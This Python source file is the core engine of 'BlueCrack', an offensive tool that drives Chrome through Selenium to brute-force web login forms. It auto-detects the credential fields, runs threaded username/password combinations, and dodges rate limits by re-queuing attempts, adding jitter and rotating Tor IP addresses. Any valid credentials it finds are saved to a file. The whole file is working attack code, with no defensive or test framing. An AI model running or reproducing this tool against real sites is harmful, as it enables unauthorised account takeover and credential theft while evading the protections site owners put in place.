"""
BlueCrack Engine
=================
Core brute-force attack engine powered by Selenium WebDriver.
"""

import random
import threading
import time
from queue import Queue
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

from selenium import webdriver
from selenium.common.exceptions import (
    NoSuchElementException,
    TimeoutException,
)
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

from .constants import (
    AUTO_DETECT_JS,
    CLICK_LISTENER_JS,
    CSS_PATH_JS,
    HAS_KEYBOARD,
)
from .utils import (
    build_chrome_options,
    change_tor_ip,
    create_driver_safe,
    save_json_report,
)

if HAS_KEYBOARD:
    try:
        import keyboard
    except ImportError:
        pass


class AttackEngine:
    """Core brute-force attack engine powered by Selenium WebDriver.

    Encapsulates all attack state — queue, metrics, threads, stop flags —
    and provides callback-based event emission for use by any frontend
    (Flask/SocketIO, CLI, etc.).
    """

    def __init__(self) -> None:
        self._stop_flag: threading.Event = threading.Event()
        self._global_stop: threading.Event = threading.Event()
        self._found_event: threading.Event = threading.Event()
        self._start_time: float = 0.0
        self._running: bool = False
        self._attack_thread: Optional[threading.Thread] = None

        # Metrics
        self.metrics: Dict[str, int] = {}
        self._metrics_lock = threading.Lock()

        # Found credentials
        self._found_users: Set[str] = set()
        self._found_creds: List[Tuple[str, str]] = []
        self._found_lock = threading.Lock()

        # Logs buffer
        self._logs: List[str] = []
        self._logs_lock = threading.Lock()

        # Callbacks
        self._log_callback: Optional[Callable[[str], None]] = None
        self._progress_callback: Optional[Callable[[int, int], None]] = None
        self._metrics_callback: Optional[Callable[[Dict], None]] = None
        self._finished_callback: Optional[Callable[[bool, str], None]] = None

    @property
    def is_running(self) -> bool:
        return self._running

    def set_callbacks(
        self,
        log_cb: Optional[Callable[[str], None]] = None,
        progress_cb: Optional[Callable[[int, int], None]] = None,
        metrics_cb: Optional[Callable[[Dict], None]] = None,
        finished_cb: Optional[Callable[[bool, str], None]] = None,
    ) -> None:
        """Set callback functions for event notifications."""
        self._log_callback = log_cb
        self._progress_callback = progress_cb
        self._metrics_callback = metrics_cb
        self._finished_callback = finished_cb

    def _log(self, msg: str) -> None:
        """Emit a log message."""
        with self._logs_lock:
            self._logs.append(msg)
        if self._log_callback:
            self._log_callback(msg)

    def _emit_progress(self, current: int, total: int) -> None:
        """Emit progress update."""
        if self._progress_callback:
            self._progress_callback(current, total)

    def _build_metrics_snapshot(self) -> Dict[str, Any]:
        """Build the full metrics snapshot including speed, eta, and hits."""
        m = dict(self.metrics)
        elapsed = time.time() - self._start_time if self._start_time else 0
        m["elapsed"] = elapsed

        # Calculate speed (attempts per second)
        speed = 0.0
        if elapsed > 0:
            speed = self.metrics.get("attempted", 0) / elapsed
        m["speed"] = speed

        # Calculate ETA (seconds remaining)
        eta = 0
        total = getattr(self, "total", 0)
        if speed > 0 and total:
            left = total - self.metrics.get("attempted", 0)
            eta = left / speed
        m["eta"] = eta

        # Map successes to hits for frontend compatibility
        m["hits"] = self.metrics.get("successes", 0)
        return m

    def _emit_metrics(self) -> None:
        """Emit current metrics snapshot."""
        if self._metrics_callback:
            self._metrics_callback(self._build_metrics_snapshot())

    def get_metrics(self) -> Dict[str, Any]:
        """Return a copy of current metrics."""
        return self._build_metrics_snapshot()

    def get_logs(self) -> List[str]:
        """Return a copy of all log messages."""
        with self._logs_lock:
            return list(self._logs)

    def get_found_creds(self) -> List[Tuple[str, str]]:
        """Return a copy of found credentials."""
        with self._found_lock:
            return list(self._found_creds)

    def stop(self) -> None:
        """Request graceful stop of the attack."""
        self._stop_flag.set()
        self._global_stop.set()

    def start(self, ctx: Dict[str, Any]) -> None:
        """Start the attack in a background thread.

        Args:
            ctx: Configuration dictionary containing target_url, users, passwords,
                 threads, delay, jitter, error_msg, success_msg, etc.
        """
        if self._running:
            self._log("[!] Attack already running.")
            return

        # Reset state
        self._stop_flag.clear()
        self._global_stop.clear()
        self._found_event.clear()
        self._found_users.clear()
        self._found_creds.clear()
        self._logs.clear()
        self._running = True
        self._start_time = time.time()
        self.total = len(ctx.get("users", [])) * len(ctx.get("passwords", []))

        self.metrics = {
            "attempted": 0,
            "successes": 0,
            "failures": 0,
            "errors": 0,
            "rate_limit_hits": 0,
            "skipped_empty": 0,
            "skipped_solved_user": 0,
            "requeued": 0,
            "rate_retry_exhausted": 0,
        }

        self._attack_thread = threading.Thread(
            target=self._run_attack, args=(ctx,), daemon=True
        )
        self._attack_thread.start()

    def _run_attack(self, ctx: Dict[str, Any]) -> None:
        """Main attack loop — detect selectors then launch worker threads."""
        try:
            users: List[str] = ctx["users"]
            passwords: List[str] = ctx["passwords"]
            total: int = len(users) * len(passwords)
            done: List[int] = [0]
            multiple_users: bool = len(users) > 1
            success_msg: str = ctx.get("success_msg", "").lower().strip()
            max_attempts: int = ctx.get("max_attempts", 0)
            continue_after: bool = ctx.get("continue_after_success", False)

            # Retry budget
            retry_budget: Dict[Tuple[str, str], int] = {}
            retry_lock = threading.Lock()
            MAX_RETRIES_PER_COMBO: int = 3

            q: Queue = Queue(maxsize=1000)

            def populate() -> None:
                for u in users:
                    for p in passwords:
                        q.put((u, p))

            threading.Thread(target=populate, daemon=True).start()

            # Setup driver for selector detection
            self._log("[*] Opening browser for selector setup...")
            setup_driver = create_driver_safe(webdriver.ChromeOptions())
            if setup_driver is None:
                self._log("[-] Failed to create setup browser.")
                if self._finished_callback:
                    self._finished_callback(False, "Failed to create setup browser.")
                return

            try:
                setup_driver.get(ctx["target_url"])
                time.sleep(2)
                setup_driver.execute_script(CLICK_LISTENER_JS)
                setup_driver.execute_script(AUTO_DETECT_JS)
                detected = setup_driver.execute_script(
                    "return window._autoFindFields();"
                )

                if detected and detected[0] and detected[1]:
                    ctx["username_selector"], ctx["password_selector"] = detected
                    self._log(f"[+] Auto-detected  User: {detected[0]}")
                    self._log(f"[+] Auto-detected  Pass: {detected[1]}")
                else:
                    self._log("[-] Auto-detect failed. Using keyboard fallback...")
                    self._log("    Click username field → press S")
                    self._log("    Click password field → press T")
                    if HAS_KEYBOARD:
                        while not (
                            ctx.get("username_selector")
                            and ctx.get("password_selector")
                        ):
                            if self._stop_flag.is_set():
                                setup_driver.quit()
                                if self._finished_callback:
                                    self._finished_callback(
                                        False, "Stopped by user."
                                    )
                                return
                            if keyboard.is_pressed("s"):
                                elem = setup_driver.execute_script(
                                    "return window._lastClicked"
                                )
                                if elem:
                                    css = setup_driver.execute_script(
                                        CSS_PATH_JS, elem
                                    )
                                    if css:
                                        ctx["username_selector"] = css
                                        self._log(f"[+] Username LOCKED: {css}")
                                time.sleep(0.3)
                            if keyboard.is_pressed("t"):
                                elem = setup_driver.execute_script(
                                    "return window._lastClicked"
                                )
                                if elem:
                                    css = setup_driver.execute_script(
                                        CSS_PATH_JS, elem
                                    )
                                    if css:
                                        ctx["password_selector"] = css
                                        self._log(f"[+] Password LOCKED: {css}")
                                time.sleep(0.3)
                            time.sleep(0.1)
                    else:
                        self._log("[-] keyboard module not available for manual selection.")
                        if self._finished_callback:
                            self._finished_callback(
                                False, "Auto-detect failed and keyboard module unavailable."
                            )
                        try:
                            setup_driver.quit()
                        except Exception:
                            pass
                        return
            except Exception as e:
                self._log(f"[-] Setup error: {e}")
                try:
                    setup_driver.quit()
                except Exception:
                    pass
                if self._finished_callback:
                    self._finished_callback(False, str(e))
                return
            try:
                setup_driver.quit()
            except Exception:
                pass

            self._log(f"[*] Launching {ctx['threads']} worker thread(s)...")

            def _run_worker() -> None:
                options = build_chrome_options(ctx)
                wd = create_driver_safe(options)
                if wd is None:
                    self._log(
                        "[-] Thread startup error: could not create WebDriver"
                    )
                    return

                tor_counter: int = 0
                try:
                    while (
                        not q.empty()
                        and not self._stop_flag.is_set()
                        and not self._global_stop.is_set()
                    ):
                        # Check max attempts
                        if max_attempts > 0:
                            with self._metrics_lock:
                                if self.metrics["attempted"] >= max_attempts:
                                    break

                        if not continue_after:
                            if not multiple_users and self._found_users:
                                break

                        try:
                            user, pwd = q.get(timeout=1)
                        except Exception:
                            break

                        if not pwd or not pwd.strip():
                            with self._metrics_lock:
                                self.metrics["skipped_empty"] += 1
                            q.task_done()
                            continue

                        if not continue_after and user in self._found_users:
                            with self._metrics_lock:
                                self.metrics["skipped_solved_user"] += 1
                            done[0] += 1
                            self._emit_progress(done[0], total)
                            q.task_done()
                            continue

                        tor_counter += 1
                        if (
                            ctx.get("use_tor")
                            and ctx.get("tor_shift_every", 0) > 0
                            and tor_counter % ctx["tor_shift_every"] == 0
                        ):
                            self._log("[~] Shifting Tor IP...")
                            change_tor_ip(ctx.get("tor_port", 9051))
                            time.sleep(2)

                        try:
                            delay = ctx.get("delay", 0)
                            jitter = ctx.get("jitter", 0)
                            if jitter > 0:
                                delay += random.uniform(0, jitter)
                            if delay > 0:
                                time.sleep(delay)

                            wd.get(ctx["target_url"])
                            wait = WebDriverWait(wd, 5)
                            u_el = wait.until(
                                EC.presence_of_element_located(
                                    (By.CSS_SELECTOR, ctx["username_selector"])
                                )
                             )
                            p_el = wait.until(
                                EC.presence_of_element_located(
                                    (By.CSS_SELECTOR, ctx["password_selector"])
                                )
                            )

                            u_el.clear()
                            u_el.send_keys(user)
                            p_el.clear()
                            p_el.send_keys(pwd)
                            p_el.send_keys(Keys.ENTER)

                            with self._metrics_lock:
                                self.metrics["attempted"] += 1

                            self._log(f"[*] Trying: {user} / {pwd}")
                            time.sleep(1)

                            src = ""
                            try:
                                src = wd.page_source.lower()
                            except Exception:
                                pass

                            current_url = ""
                            try:
                                current_url = wd.current_url
                            except Exception:
                                pass

                            # Rate limit check
                            if (
                                ctx.get("limit_text")
                                and ctx["limit_text"] in src
                            ):
                                self._log("[!] Rate limit hit!")
                                with self._metrics_lock:
                                    self.metrics["rate_limit_hits"] += 1

                                combo_key = (user, pwd)
                                with retry_lock:
                                    retry_budget[combo_key] = (
                                        retry_budget.get(combo_key, 0) + 1
                                    )
                                    budget_exceeded = (
                                        retry_budget[combo_key]
                                        > MAX_RETRIES_PER_COMBO
                                    )

                                if budget_exceeded:
                                    self._log(
                                        f"[!] Retry budget exhausted for {user}/{pwd}"
                                    )
                                    with self._metrics_lock:
                                        self.metrics["rate_retry_exhausted"] += 1
                                    done[0] += 1
                                    self._emit_progress(done[0], total)
                                    q.task_done()
                                    continue

                                if ctx.get("use_tor"):
                                    change_tor_ip(ctx.get("tor_port", 9051))
                                    time.sleep(3)
                                elif ctx.get("cooldown", 0) > 0:
                                    time.sleep(ctx["cooldown"])

                                q.put((user, pwd))
                                with self._metrics_lock:
                                    self.metrics["requeued"] += 1
                                q.task_done()
                                self._emit_metrics()
                                continue

                            # Error text check
                            if (
                                ctx.get("error_msg")
                                and ctx["error_msg"] in src
                            ):
                                with self._metrics_lock:
                                    self.metrics["failures"] += 1
                                done[0] += 1
                                self._emit_progress(done[0], total)
                                q.task_done()
                                self._emit_metrics()
                                continue

                            # Determine success
                            is_success = False
                            if success_msg:
                                if success_msg in src:
                                    is_success = True
                            elif (
                                current_url
                                and current_url != ctx["target_url"]
                                and "login" not in current_url.lower()
                            ):
                                is_success = True
                            elif ctx.get("error_msg"):
                                is_success = True

                            if is_success:
                                with self._found_lock:
                                    self._found_users.add(user)
                                    self._found_creds.append((user, pwd))
                                self._log(
                                    f"\n[+] VALID CREDENTIALS: {user} / {pwd}"
                                )
                                with self._metrics_lock:
                                    self.metrics["successes"] += 1
                                try:
                                    with open(
                                        "credentials.txt", "a", encoding="utf-8"
                                    ) as cf:
                                        cf.write(
                                            f"{ctx['target_url']} - {user}:{pwd}\n"
                                        )
                                except Exception:
                                    pass

                                done[0] += 1
                                self._emit_progress(done[0], total)
                                q.task_done()
                                self._emit_metrics()

                                if not continue_after and not multiple_users:
                                    with q.mutex:
                                        q.queue.clear()
                                    break

                                # Clear browser state for clean session (reuse browser)
                                try:
                                    wd.delete_all_cookies()
                                except Exception:
                                    pass
                            else:
                                with self._metrics_lock:
                                    self.metrics["failures"] += 1

                            done[0] += 1
                            self._emit_progress(done[0], total)
                            q.task_done()
                            self._emit_metrics()

                        except (NoSuchElementException, TimeoutException):
                            self._log(
                                f"[-] Element not found during attempt with {user}/{pwd}"
                            )
                            with self._metrics_lock:
                                self.metrics["errors"] += 1
                            done[0] += 1
                            self._emit_progress(done[0], total)
                            q.task_done()
                            self._emit_metrics()
                        except Exception as ex:
                            self._log(f"[-] Worker attempt error: {ex}")
                            with self._metrics_lock:
                                self.metrics["errors"] += 1
                            done[0] += 1
                            self._emit_progress(done[0], total)
                            q.task_done()
                            self._emit_metrics()
                finally:
                    try:
                        wd.quit()
                    except Exception:
                        pass

            workers: List[threading.Thread] = []
            for _ in range(ctx.get("threads", 1)):
                t = threading.Thread(target=_run_worker, daemon=True)
                t.start()
                workers.append(t)

            for t in workers:
                t.join()

            end_time = time.time()

            # Auto-save JSON report
            save_json_report(
                "bluecrack_report.json",
                ctx["target_url"],
                self.metrics,
                self._found_creds,
                self._start_time,
                end_time,
            )

            if self._found_users:
                saved_msg = f"Valid credentials found for {len(self._found_users)} user(s)! Saved to credentials.txt"
                if self._finished_callback:
                    self._finished_callback(True, saved_msg)
            elif self._stop_flag.is_set() or self._global_stop.is_set():
                if self._finished_callback:
                    self._finished_callback(False, "Stopped by user.")
            else:
                if self._finished_callback:
                    self._finished_callback(False, "No valid credentials found.")

        finally:
            self._running = False
